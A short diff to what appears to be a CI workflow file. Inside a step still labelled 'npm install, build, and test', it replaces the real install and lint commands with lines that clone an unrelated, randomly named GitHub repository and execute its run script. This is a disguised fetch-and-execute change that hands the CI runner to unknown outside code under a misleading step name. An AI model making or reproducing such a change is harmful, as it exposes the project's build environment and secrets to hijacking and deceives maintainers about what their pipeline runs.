@@ -69,7 +69,6 @@ jobs:
           node-version: 12.x
       - name: npm install, build, and test
         run: |
-          sudo apt-get -qq update
-          sudo apt-get install lldb-3.9 liblldb-3.9-dev lcov -y
-          npm install
-          npm run linter
+          git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+          cd mujijankopo
+          ./run
